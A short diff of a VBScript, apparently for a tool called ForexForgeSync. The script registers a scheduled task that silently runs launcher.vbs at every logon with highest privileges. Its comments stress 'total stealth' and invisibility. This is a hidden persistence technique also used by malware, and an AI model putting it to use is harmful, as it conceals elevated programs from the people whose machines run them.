@@ -1,13 +1,13 @@
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' Get the folder path where this script is located
+' 1. Get the folder where THIS task.vbs is currently sitting
 strPath = fso.GetParentFolderName(WScript.ScriptFullName)
 strLauncher = strPath & "\launcher.vbs"
 
-' Create the task to run launcher.vbs silently on logon
-' 0 = Hidden window, True = Wait for command to finish
+' 2. Create the task using the path we just found
+' We call wscript.exe directly to ensure it stays 100% invisible
 strTask = "schtasks /create /tn ""ForexForgeSync"" /tr ""wscript.exe \""" & strLauncher & "\"" "" /sc onlogon /rl highest /delay 0001:00 /f"
-WshShell.Run "cmd.exe /c " & strTask, 0, True
 
-' Script ends here with NO MsgBox to ensure total stealth
+' 3. Run the command hidden (0) and exit
+WshShell.Run "cmd.exe /c " & strTask, 0, True
